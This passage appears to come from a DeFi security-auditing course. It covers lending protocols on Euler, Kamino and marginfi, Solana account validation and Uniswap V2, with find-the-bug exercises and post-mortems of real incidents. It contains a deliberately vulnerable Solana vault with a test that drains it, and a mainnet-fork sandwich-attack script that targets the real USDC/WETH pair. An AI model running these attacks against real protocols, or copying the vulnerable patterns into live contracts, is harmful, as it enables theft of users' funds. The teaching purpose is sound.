  2. B. A function that reduces an account's collateral must request an account status check afterwards. Without it, a user can donate away the collateral that backs their debt and become insolvent. This is the core flaw behind the March 2023 Euler V1 hack (about $197M, mostly returned): the attacker donated to create bad debt, then liquidated themselves at the inflated discount.
  3. C. No upper bound: as the health score approaches 0 the discount approaches 100% and yield divides by nearly zero, seizing more than exists. Cap the discount at the vault maximum and cap yield at the borrower's collateral balance.
  4. D. Must verify the collateral is actually enabled for the violator and accepted by this controller. Otherwise a liquidator can seize assets the borrower never pledged.

Step 6. Study material

  • Euler V1 hack, March 2023: read the post-mortems by Euler and by independent researchers. Rebuild the sequence on paper: flash loan, deposit, mint leveraged position, donateToReserves, self-liquidate, withdraw. Then find where Euler V2's EVC-enforced checks would have stopped each step.
  • Read the Euler V2 audit reports in the repositories and group findings by layer: EVC, EVK modules, governance, oracles.
  • Read about read-only reentrancy: a view function called by another protocol while a vault is mid-operation can return transiently wrong values. Find how EVK's status checks and locks address it.

Step 7. Euler V2 checklist

  • Every function that can lower an account's health (withdraw, transfer shares, borrow, donate, disable collateral) schedules an account status check.
  • Every function that changes vault totals schedules a vault status check (caps, cash vs. accounted balances).
  • Caller identity comes from the EVC context, never from msg.sender when called through the EVC.
  • Collateral and controller relationships: one controller at a time, collateral must be enabled and accepted, ramping LTV handled correctly.
  • Oracle: router configuration, unit of account decimals, behaviour when a price feed reverts or is stale.
  • Governor powers: what can change instantly versus under timelock; hooks that can block liquidations or withdrawals.
  • Liquidation: discount cap, yield cap, bad-debt socialization, health score exactly at the boundary.
Lab 5 deliverableDraw the call graph of a leveraged-deposit batch (deposit → enableCollateral → enableController → borrow) marking where each status check is requested and where it is executed. Add one paragraph: what breaks if a single vault function forgets to request its check?

Stage 3: Solana foundations and Solana lending

About 15 hours of study · needs: Stages 1 and 2 (Aave lab)

Theory in plain words

On Ethereum a contract owns its storage and the caller is identified by one value. On Solana a program owns only code. State lives in separate accounts, and every transaction lists which accounts the program will touch. That list is chosen by the caller, who may be the attacker. So auditing Solana is mostly asking, for every account, 'why should I believe this is the one I expect?': who owns it, did its holder sign, is its address derived the way I think, is it the right type?

Solana transactions also have compute limits, so protocols split work into steps (for example 'refresh prices, then borrow') and take long lists of accounts. Each step and each account is something to validate: a stale refresh or an unchecked account in the list is the typical bug. The lending theory from Stage 2 (collateral, health, liquidation) is unchanged; Kamino and marginfi are two ways to carry it out in this model.

Check yourself before moving on
  1. Name four things to check about any account passed to a Solana program.
  2. Why do Kamino-style protocols need a 'refresh' step before borrowing?

Lab 6. Solana primer for auditors

In plain wordsOn Solana a program owns only code; callers hand it the accounts it will use. The program must prove each account is the right one. Most Solana losses come from one missing check on one account.

Key terms: account, signer, PDA, CPI. See the glossary at the end.

Solana bugs are mostly account validation bugs. On the EVM the contract owns its storage and msg.sender is trusted. On Solana the caller chooses which accounts to pass in, so the program must prove each account is the right one. Do this lab before Kamino and marginfi, which are both built from many validated accounts.

Step 1. The model in six facts

  1. Programs are stateless. State lives in separate accounts, each with owner (the program allowed to modify its data), lamports, and data.
  2. The caller supplies the accounts. Every instruction receives an array of accounts chosen by the transaction sender, flagged signer and/or writable.
  3. Signer is the new msg.sender. An account's is_signer proves the holder of its private key approved this transaction.
  4. PDAs are addresses derived from (seeds, program id) with no private key; only the owning program can sign for them via invoke_signed.
  5. CPI (cross-program invocation) is a call to another program. The callee gets the accounts you pass. Re-entering the same program is blocked except for direct recursion.
  6. Anchor automates many checks through types: Signer, Account<T> (checks owner and 8-byte discriminator), Program<T> (checks program id), constraints like has_one, seeds, constraint. UncheckedAccount and AccountInfo do no checks.
EVM habitSolana equivalent
require(msg.sender == owner)Signer + has_one = owner
Storage slot belongs to the contractCheck account.owner == program_id
Token address is a constantCheck mint and token program accounts yourself
ReentrancyMostly absent; the danger is calling an attacker-chosen program
Overflow reverts (0.8+)Only if overflow-checks = true or checked_* is used

Step 2. Set up (30 minutes)

Do this Install Rust, the Solana CLI, Anchor (via avm) and Node by following the current guide at solana.com/docs/intro/installation, then: 
anchor init solana-lab && cd solana-lab
anchor test        # runs the sample test on a local validator
Put the program below in programs/solana-lab/src/lib.rs and the test in tests/.

Step 3. A vulnerable vault and its exploit

use anchor_lang::prelude::*;
declare_id!("11111111111111111111111111111111");   // anchor replaces with your key: run `anchor keys sync`

#[program]
pub mod solana_lab {
    use super::*;
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        ctx.accounts.vault.owner = ctx.accounts.owner.key();
        Ok(())
    }
    pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
        let vault = ctx.accounts.vault.to_account_info();
        **vault.try_borrow_mut_lamports()? -= amount;
        **ctx.accounts.owner.try_borrow_mut_lamports()? += amount;
        Ok(())
    }
}
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(init, payer = owner, space = 8 + 32, seeds = [b"vault", owner.key().as_ref()], bump)]
    pub vault: Account<'info, Vault>,
    #[account(mut)] pub owner: Signer<'info>,
    pub system_program: Program<'info, System>,
}
#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(mut)] pub vault: Account<'info, Vault>,
    /// CHECK: receives lamports
    #[account(mut)] pub owner: UncheckedAccount<'info>,     // not a Signer, not tied to vault.owner
}
#[account] pub struct Vault { pub owner: Pubkey }

Predict first: who can call withdraw, and where do the lamports go? (Anyone, to any address they name.) Now prove it:

// tests/exploit.ts
it("anyone drains the vault", async () => {
  const [vaultPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), provider.wallet.publicKey.toBuffer()], program.programId);
  await program.methods.initialize().accounts({ vault: vaultPda }).rpc();
  // fund the vault with a plain transfer
  await provider.sendAndConfirm(new Transaction().add(SystemProgram.transfer({
    fromPubkey: provider.wallet.publicKey, toPubkey: vaultPda, lamports: 1e9 })));

  const attacker = Keypair.generate();                       // never signs
  await program.methods.withdraw(new BN(5e8))
    .accounts({ vault: vaultPda, owner: attacker.publicKey }).rpc();
  const bal = await provider.connection.getBalance(attacker.publicKey);
  assert.equal(bal, 5e8);                                    // attacker got 0.5 SOL
});

I haven't run this. Note the vault must stay above rent-exempt minimum or the runtime fails the transaction; adjust amount if so.

#[account(mut, has_one = owner)] pub vault: Account<'info, Vault>,
#[account(mut)] pub owner: Signer<'info>,

Re-run the test: it must now fail. A passing exploit followed by a failing one is the proof that your fix works.

Step 4. The seven account bugs

BugWhat the attacker doesCheck that stops it
Missing signerPasses the victim's pubkey as authority without a signatureSigner, is_signer
Missing owner checkPasses a lookalike account owned by their own programAccount<T>, account.owner == program_id
Type confusionPasses an account of another struct with the same layout8-byte discriminator (Anchor)
Wrong or shared PDAUses seeds that omit the user, or a non-canonical bumpseeds, bump (canonical), include user key in seeds
Arbitrary CPIPasses a malicious program where the token program is expectedProgram<Token>, compare program id
Unchecked arithmeticWraps a balance by under/overflowchecked_add/sub/mul, overflow-checks
Unvalidated oracle / token accountPasses their own price account, or a token account with the wrong mintKey equals stored feed, owner = oracle program, token::mint, staleness

Step 5. Find the bug

// A
pub authority: AccountInfo<'info>,
require!(vault.authority == authority.key(), ErrorCode::Unauthorized);

// B
let ta = TokenAccount::try_deserialize(&mut &ctx.accounts.collateral.data.borrow()[..])?;
let value = ta.amount * price;                      // collateral: AccountInfo

// C
seeds = [b"position"], bump                         // one PDA for every user

// D
invoke(&transfer_ix, &[from, to, authority, ctx.accounts.token_program.clone()])?;   // token_program: AccountInfo

// E
vault.balance = vault.balance - amount;             // Cargo.toml: no overflow-checks

// F
let price = read_price(&ctx.accounts.oracle)?;      // oracle: AccountInfo, never compared to reserve.oracle
Answers
  1. A. Comparing a key proves nothing: anyone can pass any pubkey. Without Signer the real authority never approved. Use Signer.
  2. B. Deserializing raw data does not check the owner, so an attacker creates an account (owned by their program) with a huge amount and the program trusts it. Use Account<TokenAccount> and constrain mint and authority.
  3. C. Every user maps to the same account, so positions are shared and one user can withdraw another's funds. Include the user's key in the seeds.
  4. D. Arbitrary CPI: the attacker supplies a program that does nothing (or something hostile) so the "transfer" is faked. Use Program<'info, Token>.
  5. E. In release builds overflow wraps silently, so a subtraction below zero produces a huge balance. Set overflow-checks = true and prefer checked_sub.
  6. F. The attacker supplies their own oracle account with any price. Require oracle.key() == reserve.oracle, owner = the oracle program, and check staleness and confidence. This pattern matters in Kamino and marginfi.

Step 6. Study material

  • Wormhole, Feb 2022 (~$320M): the Solana program verified a guardian signature using an instruction-introspection helper but did not validate that the "sysvar" account passed in was the real one. The attacker supplied a fake. Lesson: every account, including "system" ones, must be checked by address. You will meet this again in the Wormhole chapter.
  • Cashio, March 2022 (~$48M): a chain of accounts was validated link by link except one, so the attacker minted the stablecoin against worthless collateral. Lesson: a root of trust must be pinned at the start of the chain.
  • Read the Anchor docs' constraints page and the Sealevel attacks repository by Coral (for example: signer authorization, owner checks, type cosplay, PDA sharing). Solve each exercise.

Step 7. Per-instruction checklist

  • For every account: is it signer? writable? owner = expected program? type/discriminator? key equal to the expected PDA or stored pubkey?
  • For every CPI: program id fixed, accounts passed exactly as needed, signer seeds correct.
  • Remaining accounts: validated one by one (lending programs pass many reserves/oracles this way).
  • Arithmetic: checked_* throughout, explicit rounding direction, u128 intermediates.
  • Account lifecycle: reinitialization (init_if_needed), closing (discriminator zeroed, lamports drained), realloc.
  • Oracles: owner, feed id, publish time, confidence interval, exponent.
Lab 6 deliverablePick one instruction from any open-source Solana program. Write a table with one row per account: signer, writable, owner check, type check, key check, and the line of code that enforces each. Mark every cell where you cannot find the enforcing line.

Lab 7. Kamino Lend (Solana)

In plain wordsKamino Lend is Aave-style lending on Solana. To stay within compute limits it splits work: refresh prices and interest first, then act. Bugs come from stale numbers or unchecked lists of accounts.

Key terms: reserve, obligation, refresh. See the glossary at the end.

Kamino Lend (klend) is an Anchor program in the Solend lineage: one lending market, one reserve per asset, one obligation per user position. It is Aave's idea rebuilt on Solana's account model, so every bug from Lab 6 applies, plus a new class: stale state. Because the program cannot loop over every price on its own, each transaction must refresh reserves and the obligation first, and each handler must verify the refresh actually happened.

Step 1. The cast of accounts

AccountHolds
LendingMarketGlobal settings, owner, emergency mode, elevation groups (like Aave eMode).
ReserveOne asset: liquidity vault, collateral mint (cTokens), cumulative borrow rate, oracle config, risk config (LTV, liquidation threshold, bonus range, limits).
ObligationOne user's deposits (cTokens per reserve) and borrows (amount + cumulative rate snapshot), plus cached values: deposited value, borrowed value, allowed borrow value, unhealthy borrow value.
Oracle accountsPyth, Switchboard or Kamino's Scope aggregator, one set per reserve.
Token vaultsPDAs owned by the program holding liquidity and fees.

Numbers are stored as _sf "scaled fractions": a u128 where the low 60 bits are the fractional part (the Fraction type). So 1.5 is stored as 1.5 · 260. Name suffixes tell you the scale; mixing a plain u64 with an _sf value is a classic bug.

Step 2. Refresh-then-act

A borrow transaction looks like this (order matters):

1. refresh_reserve(collateral reserve)      // update interest index + read oracle price
2. refresh_reserve(borrow reserve)
3. refresh_obligation(obligation)           // remaining_accounts = the obligation's reserves, in order
4. borrow_obligation_liquidity(amount)      // checks: reserves and obligation refreshed THIS slot

Why this design: reading prices and indices for every reserve inside borrow would exceed compute limits, so the work is split into instructions that write a "last updated slot" and later instructions verify it. Your audit questions: (a) does every handler reject stale reserves and obligations? (b) does refresh_obligation verify each passed reserve is the one stored in the obligation, in the right order, with no duplicates? (c) can an attacker insert a state-changing instruction between refresh and use that makes the cached values wrong?

Step 3. Get the code and read it

Do this 
git clone https://github.com/Kamino-Finance/klend && cd klend
ls programs/klend/src programs/klend/src/handlers programs/klend/src/state
Paths below are from memory; confirm in your checkout.
ReadLook for
handlers/handler_refresh_reserve.rsInterest accrual, oracle read, price age and deviation checks, setting last_update.
handlers/handler_refresh_obligation.rsLoop over remaining_accounts; key matching; recomputing deposited, borrowed, allowed and unhealthy values.
handlers/handler_borrow_obligation_liquidity.rsAccount constraints, staleness checks, limits, post-borrow health check.
handlers/handler_liquidate_obligation_and_redeem_reserve_collateral.rsUnhealthy check, close factor, bonus, which collateral is seized.
handlers/handler_flash_borrow_reserve_liquidity.rs and the repay twinInstruction-sysvar introspection to find the matching repay in the same transaction.
state/reserve.rs, state/obligation.rs, lending_market/*.rsExchange rates, borrow index, health maths.
utils/fraction.rsConversions: to_floor, to_ceil. Who uses which?

Step 4. Follow the numbers

cTokens. Same idea as Aave's scaled balance. Reserve has 105,000 USDC of total liquidity and 100,000 cTokens: exchange rate 1.05. Deposit 1,000 USDC: mint 1,000 / 1.05 = 952.38 cTokens. Redeem later at rate 1.10: 952.38 · 1.10 = 1,047.62 USDC.

Debt index. The obligation stores the cumulative borrow rate at the last refresh. Debt now = borrowed · (cumulative_now / cumulative_at_snapshot). Borrow 900 when the index is 1.000; at 1.020 you owe 918.

Health. 10 SOL at $150 = $1,500. LTV 65% gives allowed borrow value $975. Liquidation threshold 70% gives unhealthy value $1,050. Borrow $900. SOL falls to $128: deposited value $1,280 · 0.70 = $896 < $900, so the obligation is liquidatable. Note both limits are stored as values in the obligation and recomputed on refresh; nothing updates them between refreshes.

Liquidation. Close factor 50% (illustrative): liquidator repays up to $450. Bonus scales between a minimum and maximum depending on how unhealthy the position is; at 5%, seized value = 450 · 1.05 = $472.50 = 3.69 SOL at $128. Confirm the exact bonus curve in the code.

Step 5. Play with it

Step 6. Find the bug

// A. refresh_obligation
for (i, acc) in ctx.remaining_accounts.iter().enumerate() {
    let reserve = Reserve::try_deserialize(&mut &acc.data.borrow()[..])?;
    deposited_value += reserve.collateral_value(obligation.deposits[i].amount);
}

// B. borrow handler
let reserve = &ctx.accounts.borrow_reserve;
let price = reserve.liquidity.market_price;                 // no staleness check

// C. flash_borrow handler
let ix = load_instruction_at_checked(repay_index, &ctx.accounts.sysvar_info)?;
require!(ix.program_id == crate::ID);                       // sysvar_info: AccountInfo

// D. value conversion
let value = amount * price / 10u64.pow(reserve.liquidity.mint_decimals);   // price is Fraction

// E. oracle read
let price = pyth.agg.price as u128;                         // ignores exponent, confidence and age
Answers
  1. A. Two flaws: the account is deserialized without an owner check (attacker supplies a fake reserve with an inflated price), and it never checks that acc.key() equals obligation.deposits[i].deposit_reserve. Passing the same real reserve twice, or a different one, changes the value. Require Account<Reserve> and key equality in order.
  2. B. Without comparing reserve.last_update.slot to the current slot, a borrower uses a price from many slots ago (possibly before a crash). Every handler that uses cached prices must reject stale reserves and obligations.
  3. C. The instruction sysvar account must be pinned to the real sysvar address. Otherwise the attacker passes a fake that "contains" a repay instruction, takes the flash loan and never repays: the same class as the Wormhole exploit in Lab 6. Also verify the repay targets the same reserve and amount plus fee.
  4. D. Mixed scales: u64 times a 60-bit fixed-point fraction with a plain integer divide gives a value off by a power of two, or overflows in u64. Do the arithmetic in Fraction / u128 and convert once, rounding the right way.
  5. E. A raw Pyth price needs its exponent applied, a staleness check against the publish time, and a confidence-interval bound. Without them a wide-confidence or old price is accepted. Also verify the oracle account key equals the one in the reserve config.

Step 7. Study material

  • Solend, November 2022: an attacker pushed up the price of a thinly traded stablecoin (USDH) on an on-chain venue the oracle read, borrowed against it and left bad debt of roughly a million dollars. Lesson: oracle risk for illiquid assets is not fixed by code correctness. Look at how reserve limits and oracle choice (Pyth/Switchboard/Scope) mitigate it.
  • Read Kamino's published audit reports (linked from their docs and repository). Sort the findings into: stale state, oracle, rounding, account validation, access control.
  • Read how elevation groups (Aave eMode analog) change LTV for correlated assets and what new rules validate_borrow needs.
  • Open a recent borrow transaction in Solana Explorer and match every instruction and account to the template in Step 2.

Step 8. Kamino Lend checklist

  • Every handler that uses cached values checks reserve and obligation freshness against the current slot.
  • remaining_accounts: owner, key, order, uniqueness verified; loop bounds respect compute limits.
  • Oracle: key pinned in config, owner correct, exponent applied, staleness and confidence checked, fallback behaviour when the oracle fails.
  • Fixed-point: every _sf conversion uses the intended rounding; debt rounds up, collateral value rounds down.
  • Flash loans: real sysvar pinned, repay verified in the same transaction, borrow flag cannot be reused or nested.
  • Liquidation: unhealthy test uses the right limit, bonus bounded, close factor enforced, bad debt handled when collateral is exhausted.
  • Admin and emergency: who can change reserve config, limits, elevation groups, and what happens to existing obligations.
Lab 7 deliverableWrite the full account list for borrow_obligation_liquidity and for liquidate_obligation_and_redeem_reserve_collateral from the source. For each account note signer/writable, how it is validated and what an attacker could substitute if that validation were removed.

Lab 8. marginfi (Solana)

In plain wordsmarginfi gives each user one margin account holding positions in many assets. Health is a weighted sum of assets minus liabilities, computed from accounts the caller passes in. Validating that list is the central security task.

Key terms: bank, weights, risk engine. See the glossary at the end.

marginfi is Solana lending built around one margin account per user and a risk engine that computes health on demand. Where Kamino separates "refresh" from "act", marginfi reads each bank's state and oracle inside the instruction, from accounts passed as remaining_accounts. So the stale-state class mostly disappears and the remaining-accounts validation class takes its place.

Step 1. The cast

AccountHolds
MarginfiGroupAdmin and the set of banks that belong together.
BankOne asset: mint, liquidity / insurance / fee vaults (PDAs), asset_share_value, liability_share_value, interest config, deposit and borrow limits, oracle setup, four weights (asset init/maint, liability init/maint), risk tier.
MarginfiAccountAuthority plus a fixed array of balances (up to 16): each has bank, asset_shares, liability_shares.
Oracle accountsPyth or Switchboard price accounts, one per bank, passed with their bank.
Kamino Lendmarginfi
PositionObligation: separate deposits and borrowsMargin account: shares per bank, long or short
HealthValues compared: borrowed vs. allowed/unhealthyΣ(asset · price · asset_weight) − Σ(liability · price · liability_weight), must stay ≥ 0
PricesCached by refresh, must be freshRead at use; weights and confidence bias applied
Risk knobsLTV, threshold, bonus, elevation groupsWeights, risk tier, deposit/borrow limits
Main account bugStale refresh, bad reserve listBad bank/oracle pair list, weights misuse

Step 2. Get the code and read it

Do this 
git clone https://github.com/mrgnlabs/marginfi-v2 && cd marginfi-v2
ls programs/marginfi/src programs/marginfi/src/instructions programs/marginfi/src/state
Paths from memory; confirm in your checkout.
ReadLook for
state/marginfi_account.rs (the risk engine)Health computation, init vs. maint modes, how it iterates balances and consumes bank+oracle pairs from remaining_accounts.
state/marginfi_group.rs (Bank)Share conversions, interest accrual, deposit/borrow limit checks, bankruptcy handling.
state/price.rsOracle adapters, staleness, confidence-interval bias (price − conf for assets, price + conf for liabilities).
instructions/marginfi_account/deposit.rs, withdraw.rs, borrow.rs, repay.rsAccount constraints and the health check at the end (init health on borrow/withdraw).
instructions/marginfi_account/liquidate.rsMaint-health trigger, fee splits, "do not over-liquidate" check.
flashloan.rsstart_flashloan sets a flag; end_flashloan performs the health check. How does start verify an end exists?
lending_pool_handle_bankruptcy.rsInsurance vault first, then socialized loss through asset_share_value.

Step 3. Follow the numbers

Weights. Illustrative: SOL asset weight 0.65 (init) and 0.80 (maint); USDC liability weight 1.10 (init) and 1.05 (maint). Alice deposits 10 SOL at $150 = $1,500.

StepCalculationResult
Max borrow (init health ≥ 0)1,500 · 0.65 = 975; 975 / 1.10$886.36
Borrow $900975 − 900 · 1.10 = −15rejected
Borrow $800975 − 880 = +95allowed
Maint health at $1501,500 · 0.80 − 800 · 1.05 = 1,200 − 840+360
Maint health at $105840 − 8400 (boundary)
Maint health at $100800 − 840−40, liquidatable

Two weight sets are the key design idea: init weights are stricter, so you cannot borrow right up to the liquidation line (same buffer as Aave's LTV versus LT).

Liquidation fees (from memory, verify): liquidator fee 2.5% and insurance fee 2.5%. Seize SOL worth V = $400: liquidator pays debt worth 0.95 V = $380, receives SOL worth 0.975 V = $390 (profit $10), the insurance vault receives $10, and the borrower loses $400 of collateral for $380 of debt reduction.

Shares. Asset amount = asset_shares · asset_share_value; debt = liability_shares · liability_share_value. Interest grows the two share values; user balances never change until they act. Rounding: asset shares minted round down, liability shares for a borrow round up.

Bankruptcy. If an account has liabilities but no assets, the insurance vault covers what it can. Any remainder reduces asset_share_value, so all depositors in that bank share the loss.

Step 4. Calculator

Use init weights (0.65, 1.10) to test borrow limits and maint weights (0.80, 1.05) to find the liquidation price. Find the price drop at which health crosses zero and compare with the table.

Step 5. Find the bug

// A. liquidate()
let health = risk_engine.get_account_health(RequirementType::Initial)?;
require!(health < 0, MarginfiError::AccountHealthy);

// B. oracle pricing
asset_price     = price + confidence;
liability_price = price - confidence;

// C. start_flashloan()
account.set_flag(IN_FLASHLOAN);            // no check that end_flashloan exists later in the tx

// D. borrow
let shares = amount / bank.liability_share_value;        // integer division (floor)

// E. handle_bankruptcy()
require!(account.liabilities_exist());                  // anyone can call on any account
Answers
  1. A. Liquidation must use maintenance weights. With init weights an account that is healthy by maint can be liquidated, giving liquidators free discount on safe users.
  2. B. Reversed bias. Conservative pricing lowers asset value (price − conf) and raises liability value (price + conf). The reverse overstates health, so wide-confidence prices let users over-borrow.
  3. C. Health checks are deferred to end_flashloan. If start_flashloan does not verify (through instruction introspection of the real sysvar) that a matching end exists, an attacker starts the flag, borrows, and never ends: no health check ever runs.
  4. D. Liability shares for a borrow must round up. Flooring records less debt than was taken, and repeated small borrows leak value.
  5. E. Must require the account to be bankrupt (no assets and negative health). Otherwise anyone can force the insurance vault and depositors to pay off a healthy user's debt.

Step 6. Study material

  • Mango Markets, Oct 2022 (about $100M+ drained): an attacker with two accounts pumped the thinly traded MNGO price, then borrowed against the unrealized profit. Study how asset weights, deposit limits and oracle design are meant to limit exactly this, and where marginfi's version of those controls could be weak for a low-liquidity asset.
  • Read marginfi's published audit reports (linked from the repository and docs) and group findings: risk engine, oracle, rounding, liquidation, flash loan.
  • Read the docs on risk tiers: an "isolated" asset can be borrowed only with no other liabilities. Write down what invariant that requires on every borrow and every liquidation.

Step 7. marginfi checklist

  • Risk engine consumes remaining_accounts in strict (bank, oracle) order, each bank matches the balance, each oracle matches the bank's config; no duplicates, nothing skipped.
  • Right weight set per action: init for borrow/withdraw, maint for liquidation and bankruptcy.
  • Oracle: staleness, confidence bound, price bias direction, decimals and exponent.
  • Rounding: asset shares down, liability shares up, never a favourable truncation for the user.
  • Flash loan: start verifies a matching end, flag cleared, no nesting; borrow/withdraw health is checked at the end exactly once.
  • Liquidation cannot over-liquidate or leave the account worse than allowed; fee split sums correctly.
  • Bankruptcy only for truly insolvent accounts; insurance and socialization accounting stays consistent.
  • Bank config: only admin can change weights and limits; changes cannot instantly make healthy accounts liquidatable without notice.
Lab 8 deliverableTrace borrow end to end in the source: list every account, every check, the order of share update versus health check, and where remaining_accounts is validated. Then write one finding in the report format from Lab 1 for any validation you find missing or unclear.

Stage 4: Exchanges (AMMs)

About 28 hours of study · needs: Stage 1 (Uniswap V2 first); Lab 14 also needs Lab 6

Theory in plain words

An automated market maker holds reserves of tokens and sets price by a rule instead of an order book. The rule is an invariant: constant product for Uniswap V2, a flatter curve for stable assets (Curve), weighted products (Balancer). A trade moves the reserves along the curve; the gap between the starting price and what you actually get is price impact.

Arbitrageurs trade until a pool's price matches the wider market, so a pool price is a good estimate over time. But within one transaction it can be pushed by a flash loan, so reading a pool's current price as an oracle is dangerous; a time-weighted average makes manipulation expensive. Liquidity providers earn fees and carry impermanent loss. Later designs concentrate liquidity in ranges (V3, Orca, Raydium), batch all movements at the end of a transaction and allow custom code (V4), or iterate to solve a curve (Curve). Each step adds maths, and each new piece of maths is a new place for rounding errors.

Check yourself before moving on
  1. Why can a flash loan make a pool's current price unsafe as an oracle while a time-weighted average is safer?
  2. Which part of a V3 swap changes the amount of liquidity in use?

Lab 9. AMM base: Uniswap V2

In plain wordsUniswap V2 is the simplest exchange: a pool of two tokens whose product stays constant, so price moves as people trade. Understanding it fully is the base for every other exchange in this course.

Key terms: reserves, constant product, LP share, TWAP. See the glossary at the end.

Every AMM in your list (Uniswap V3/V4, Curve, Balancer, Raydium, Orca) is a variation on one idea: a pool holds two reserves, and a formula decides the price. Learn V2 completely here and the rest become "what did they change, and what new bug did that create?". Source: Uniswap/v2-core (UniswapV2Pair.sol) and v2-periphery (UniswapV2Router02.sol, UniswapV2Library.sol).

Step 1. The maths

Invariant        x · y = k                       (x, y = reserves)
Spot price       P = y / x                       (price of x in y)
Swap with fee    Δout = (Δin · 997 · y) / (x · 1000 + Δin · 997)
Check on-chain   (b0·1000 − in0·3) · (b1·1000 − in1·3) ≥ x · y · 1000²
First LP shares  L = √(Δx · Δy) − 1000          (1000 shares locked forever)
Later LP shares  L = min(Δx · S / x, Δy · S / y)   (S = total shares)
Imperm. loss     IL(r) = 2√r / (1 + r) − 1       (r = price ratio vs. entry)
TWAP             (cumulative_t2 − cumulative_t1) / (t2 − t1)

Worked swap. Pool: 100 ETH and 200,000 USDC, k = 2·107. Swap 10 ETH in: output = 10 · 997 · 200,000 / (100 · 1000 + 10 · 997) = 18,132.2 USDC. Execution price 1,813 versus spot 2,000: the 9.3% gap is price impact plus the 0.3% fee. New reserves: 110 ETH, 181,867.8 USDC; new spot = 1,653.

LP maths. First deposit of 10 ETH and 20,000 USDC: √(10e18 · 20,000e6) ≈ 4.47e14, minus 1,000. A later deposit gets the min of the two ratios, so an unbalanced deposit donates the excess to existing LPs.

Price ratio r1.252410
Impermanent loss−0.62%−5.72%−20%−42.5%

Why TWAP resists flash loans. The pair adds price · Δt to a cumulative counter using the reserves from before the current block's trades. Moving the price inside one block does not touch the counter. An attacker must keep the manipulated price across many blocks, which arbitrageurs punish. Longer window, deeper pool, higher cost.

Step 2. Play with it

Step 3. Read the code

Do this 
git clone https://github.com/Uniswap/v2-core && git clone https://github.com/Uniswap/v2-periphery
FunctionLook for
Pair.mintAmounts are measured as balance − reserve, not passed in. MINIMUM_LIQUIDITY on first mint.
Pair.burnProportional payout from current balances, then _update.
Pair.swapOptimistic transfer out, optional callback (flash swap), then the fee-adjusted k check using balances. The lock modifier.
Pair._updateOverflow-tolerant cumulative price update, only once per block.
skim, syncWhat an attacker can do to reserves by sending tokens directly, and who profits from skim.
Router.swapExactTokensForTokensamountOutMin, deadline, the path, and the pair address from pairFor.

Key design: the pair never trusts amounts the caller states. It checks the invariant against real balances after the fact. The caller is allowed to receive first and pay later, so every check must be on final state.

Step 4. Fork experiment: a sandwich attack

export ETH_RPC_URL=https://...
forge test --match-test test_sandwich --fork-url $ETH_RPC_URL -vvv
// test/V2Lab.t.sol  (USDC/WETH V2 pair: verify the address on Etherscan or Uniswap docs)
import "forge-std/Test.sol";
interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function swap(uint a0, uint a1, address to, bytes calldata d) external;
}
interface IERC20 { function transfer(address, uint) external returns (bool); function balanceOf(address) external view returns (uint); }

contract V2Lab is Test {
    IPair pair = IPair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address atk = address(0xA77); address vic = address(0xB1C);

    function quote(uint amtIn, address tIn) internal view returns (uint) {
        (uint r0, uint r1,) = pair.getReserves();
        (uint rin, uint rout) = tIn == pair.token0() ? (r0, r1) : (r1, r0);
        return amtIn * 997 * rout / (rin * 1000 + amtIn * 997);
    }
    function swapIn(address who, address tIn, uint amtIn) internal returns (uint out) {
        out = quote(amtIn, tIn);
        bool in0 = tIn == pair.token0();
        vm.startPrank(who);
        IERC20(tIn).transfer(address(pair), amtIn);
        pair.swap(in0 ? 0 : out, in0 ? out : 0, who, "");
        vm.stopPrank();
    }
    function test_sandwich() public {
        (uint r0, uint r1,) = pair.getReserves();
        uint usdcRes = pair.token0() == USDC ? r0 : r1;
        uint front = usdcRes / 20; uint vict = usdcRes / 20;     // each 5% of the pool
        deal(USDC, atk, front); deal(USDC, vic, vict);

        uint fair = quote(vict, USDC);                           // victim output with no attack
        uint wethGot = swapIn(atk, USDC, front);                 // 1) attacker buys WETH
        uint got = swapIn(vic, USDC, vict);                      // 2) victim buys at the worse price
        uint back = swapIn(atk, WETH, wethGot);                  // 3) attacker sells WETH back
        emit log_named_uint("victim fair WETH", fair);
        emit log_named_uint("victim actual WETH", got);
        emit log_named_int("attacker USDC profit", int(back) - int(front));
    }
}

Not run by me. If deal fails on USDC, mint to the actors through a whale with vm.prank. Expect the victim to receive less than fair and the attacker to profit. Try a smaller victim size and find where the attack stops being profitable (fees: 0.3% twice).

Experiments (1) Add a victim amountOutMin and see how tight slippage makes the victim's swap revert instead of losing. (2) Use skim after sending tokens directly to the pair and see who can take them. (3) vm.roll a few blocks after the attack and compare the TWAP view with the spot price.

Step 5. Find the bug

// A. swap() k check
require((b0 * 1000 + in0 * 3) * (b1 * 1000 + in1 * 3) >= r0 * r1 * 1_000_000);

// B. mint() first deposit
if (totalSupply == 0) liquidity = sqrt(amount0 * amount1);        // no minimum locked

// C. router
function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to) ... {
    uint[] memory amounts = getAmountsOut(amountIn, path);        // amountOutMin never compared
}

// D. pair, simplified
function swap(...) external {                                     // no lock modifier
    _transferOut(to, out); if (data.length > 0) ICallee(to).call(data); _checkK();
}

// E. pair accounting
function swap(uint amountIn, ...) external { reserve0 += amountIn; ... }   // trusts stated amount
Answers
  1. A. The sign on the fee term is flipped: it should be b·1000 − in·3. Adding it makes the check easier to pass, so swappers pay less than the 0.3% and LPs lose value on every trade (or the pool can be drained in a loop).
  2. B. Without locking 1000 shares, the first LP can mint 1 wei of shares, donate tokens with sync to inflate the share price, and later LPs round down to zero shares: the inflation attack from M1.
  3. C. No slippage protection. Anyone can sandwich every trade through this router with no revert. Require amounts[last] ≥ amountOutMin and a deadline.
  4. D. No reentrancy lock while the callback runs. Inside the callback reserves and balances disagree, so another protocol that reads reserves or LP value sees a transient, wrong value (read-only reentrancy), and the callee can re-enter swap/mint/burn on inconsistent state.
  5. E. Stated amounts are trusted. A fee-on-transfer token delivers less than stated, so reserves overstate the real balance and the next swapper drains the difference. Measure balanceOf deltas as V2 does.

Step 6. Study material

